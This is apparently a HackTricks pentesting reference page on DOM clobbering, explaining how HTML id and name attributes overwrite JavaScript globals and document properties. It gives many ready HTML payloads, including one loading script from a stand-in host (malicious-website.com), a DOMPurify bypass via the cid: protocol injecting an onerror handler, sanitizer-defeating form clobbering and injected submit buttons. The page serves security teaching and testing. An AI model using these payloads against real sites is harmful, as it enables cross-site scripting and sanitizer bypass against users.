# Dom Clobbering

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## **Basics**

It's possible to generate **global variables inside the JS context** with the attributes **`id`** and **`name`** in HTML tags.

```html
<form id=x></form>
<script> console.log(typeof document.x) //[object HTMLFormElement] </script>
```

**Only** certain elements can use the **name attribute** to clobber globals, they are: `embed`, `form`, `iframe`, `image`, `img` and `object`.

Interestingly, when you use a **form element** to **clobber** a variable, you will get the **`toString`** value of the element itself: `[object HTMLFormElement]` but with **anchor** the **`toString`** will be the anchor **`href`**. Therefore, if you clobber using the **`a`** tag, you can **control** the **value** when it's **treated as a string**:

```html
<a href="controlled string" id=x></a>
<script>
console.log(x);//controlled string
</script>
```

### Arrays & Attributes

It's also possible to **clobber an array** and **object attributes**:

```html
<a id=x>
<a id=x name=y href=controlled>
<script>
console.log(x[1])//controlled
console.log(x.y)//controlled
</script>
```

To clobber **a 3rd attribute** (e.g. x.y.z), you need to use a **`form`**:

```html
<form id=x name=y><input id=z value=controlled></form>
<form id=x></form>
<script>
alert(x.y.z.value)//controlled
</script>
```

Clobbering more attributes is **more complicated but still possible**, using iframes:

```html
<iframe name=x srcdoc="<a id=y href=controlled></a>"></iframe>
<style>@import 'https://google.com';</style>
<script>alert(x.y)//controlled</script>
```

{% hint style="warning" %}
The style tag is used to **give enough time to the iframe to render**. Without it you will find an alert of **undefined**.
{% endhint %}

To clobber deeper attributes, you can use **iframes with html encoding** this way:

```html
<iframe name=a srcdoc="<iframe srcdoc='<iframe name=c srcdoc=<a/id=d&amp;amp;#x20;name=e&amp;amp;#x20;href=\controlled&amp;amp;gt;<a&amp;amp;#x20;id=d&amp;amp;gt; name=d>' name=b>"></iframe>
<style>@import 'https://google.com';</style>
<script>
alert(a.b.c.d.e)//controlled
</script>
```

### **Filter Bypassing**

If a filter is **looping** through the **properties** of a node using something like `document.getElementByID('x').attributes` you could **clobber** the attribute **`.attributes`** and **break the filter**. Other DOM properties like **`tagName`** , **`nodeName`** or **`parentNode`** and more are also **clobberable**.

```html
<form id=x></form>
<form id=y>
<input name=nodeName>
</form>
<script>
console.log(document.getElementById('x').nodeName)//FORM
console.log(document.getElementById('y').nodeName)//[object HTMLInputElement]
</script>
```

## **Clobbering `window.someObject`**

A common pattern used by JavaScript developers is:

```javascript
var someObject = window.someObject || {};
```

If you can control some of the HTML on the page, you can clobber the `someObject` reference with a DOM node, such as an anchor. Consider the following code:

```html
<script>
 window.onload = function(){
    let someObject = window.someObject || {};
    let script = document.createElement('script');
    script.src = someObject.url;
    document.body.appendChild(script);
 };
</script>
```

To exploit this vulnerable code, you could inject the following HTML to clobber the `someObject` reference with an anchor element:

{% code overflow="wrap" %}
```html
<a id=someObject><a id=someObject name=url href=//malicious-website.com/malicious.js>
```
{% endcode %}

Injecting that data **`window.someObject.url`** is going to be `href=//malicious-website.com/malicious.js`

**Trick**: **`DOMPurify`** allows you to use the **`cid:`** protocol, which **does not URL-encode double-quotes**. This means you can **inject an encoded double-quote that will be decoded at runtime**. Therefore, injecting something like **`<a id=defaultAvatar><a id=defaultAvatar name=avatar href="cid:&quot;onerror=alert(1)//">`** will make the HTML encoded `&quot;` to be **decoded on runtime** and **escape** from the attribute value to **create** the **`onerror`** event.

Another common technique consists on using **`form`** element. Some client-side libraries will go through the attributes of the created form element to sanitised it. But, if you create an `input` inside the form with `id=attributes` , you will **clobber the attributes property** and the sanitizer **won't** be able to go through the **real attributes**.

You can [**find an example of this type of clobbering in this CTF writeup**](iframes-in-xss-and-csp.md#iframes-in-sop-2).

## Clobbering document object

According to the documentation it's possible to overwrite attributes of the document object using DOM Clobbering:

> The [Document](https://html.spec.whatwg.org/multipage/dom.html#document) interface [supports named properties](https://webidl.spec.whatwg.org/#dfn-support-named-properties). The [supported property names](https://webidl.spec.whatwg.org/#dfn-supported-property-names) of a [Document](https://html.spec.whatwg.org/multipage/dom.html#document) object document at any moment consist of the following, in [tree order](https://dom.spec.whatwg.org/#concept-tree-order) according to the element that contributed them, ignoring later duplicates, and with values from [id](https://html.spec.whatwg.org/multipage/dom.html#the-id-attribute) attributes coming before values from name attributes when the same element contributes both:
>
> \- The value of the name content attribute for all [exposed](https://html.spec.whatwg.org/multipage/dom.html#exposed) [embed](https://html.spec.whatwg.org/multipage/iframe-embed-object.html#the-embed-element), [form](https://html.spec.whatwg.org/multipage/forms.html#the-form-element), [iframe](https://html.spec.whatwg.org/multipage/iframe-embed-object.html#the-iframe-element), [img](https://html.spec.whatwg.org/multipage/embedded-content.html#the-img-element), and [exposed](https://html.spec.whatwg.org/multipage/dom.html#exposed) [object](https://html.spec.whatwg.org/multipage/iframe-embed-object.html#the-object-element) elements that have a non-empty name content attribute and are [in a document tree](https://dom.spec.whatwg.org/#in-a-document-tree) with document as their [root](https://dom.spec.whatwg.org/#concept-tree-root);\
> \
> \- The value of the [id](https://html.spec.whatwg.org/multipage/dom.html#the-id-attribute) content attribute for all [exposed](https://html.spec.whatwg.org/multipage/dom.html#exposed) [object](https://html.spec.whatwg.org/multipage/iframe-embed-object.html#the-object-element) elements that have a non-empty [id](https://html.spec.whatwg.org/multipage/dom.html#the-id-attribute) content attribute and are [in a document tree](https://dom.spec.whatwg.org/#in-a-document-tree) with document as their [root](https://dom.spec.whatwg.org/#concept-tree-root);\
> \
> \- The value of the [id](https://html.spec.whatwg.org/multipage/dom.html#the-id-attribute) content attribute for all [img](https://html.spec.whatwg.org/multipage/embedded-content.html#the-img-element) elements that have both a non-empty [id](https://html.spec.whatwg.org/multipage/dom.html#the-id-attribute) content attribute and a non-empty name content attribute, and are [in a document tree](https://dom.spec.whatwg.org/#in-a-document-tree) with document as their [root](https://dom.spec.whatwg.org/#concept-tree-root).

Using this technique you can overwrite commonly used **values such as `document.cookie`, `document.body`, `document.children`**, and even methods in the Document interface like `document.querySelector`.

```javascript
document.write("<img name=cookie />")

document.cookie
<img name="cookie">

typeof(document.cookie)
'object'

//Something more sanitize friendly than a img tag
document.write("<form name=cookie><input id=toString></form>")

document.cookie
HTMLCollection(2) [img, form, cookie: img]

typeof(document.cookie)
'object
```

## Writing after the element clobbered

You can clobber the results of a **`document.getElementById()`** and a **`document.querySelector()`** call if **you inject a `<html>` or `<body>` tag with the same id attribute**. Here's an example:

```html
<div style=display:none id=cdnDomain class=x>test</div>
<p>
<html id="cdnDomain" class=x>clobbered</html>
<script>
alert(document.getElementById('cdnDomain').innerText);//clobbbered
alert(document.querySelector('.x').innerText);//clobbbered
</script>
```

What's also interesting is that you can **hide elements from `innerText`**, so if you inject a HTML/body tag you can use styles to hide it from `innerText` to prevent other text from interfering with your attack:

```html
<div style=display:none id=cdnDomain>test</div>
<p>existing text</p>
<html id="cdnDomain">clobbered</html>
<style>
p{display:none;}
</style>
<script>
alert(document.getElementById('cdnDomain').innerText);//clobbbered
</script>
```

We looked at SVG too and it's possible to use the `<body>` tag there:

```html
<div style=display:none id=cdnDomain>example.com</div>
<svg><body id=cdnDomain>clobbered</body></svg>
<script>
alert(document.getElementById('cdnDomain').innerText)//clobbered
</script>
```

You need a `<foreignobject>` tag in order to use the HTML tag inside SVG on both Chrome and Firefox:

```html
<div style=display:none id=cdnDomain>example.com</div>
<svg>
<foreignobject>
<html id=cdnDomain>clobbered</html>
</foreignobject>
</svg>
<script>
alert(document.getElementById('cdnDomain').innerText)//clobbered
</script>
```

## Clobbering Forms

It's possible to add **new entries inside a form** just by **specifying the `form` attribute** inside some tags. You can use this to **add new values inside a form** and to even add a new **button** to **send it** (clickjacking or abusing some `.click()` JS code):

{% code overflow="wrap" %}
```html
<!--Add a new attribute and a new button to send-->
<textarea form=id-other-form name=info>
";alert(1);//
</textarea>
<button form=id-other-form type="submit" formaction="/edit" formmethod="post">
Click to send!
</button>
```
{% endcode %}

* For more form attributes in [**button check this**](https://www.w3schools.com/tags/tag\_button.asp)**.**

## References

* [https://portswigger.net/research/hijacking-service-workers-via-dom-clobbering](https://portswigger.net/research/hijacking-service-workers-via-dom-clobbering)
* Heyes, Gareth. JavaScript for hackers: Learn to think like a hacker.

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>
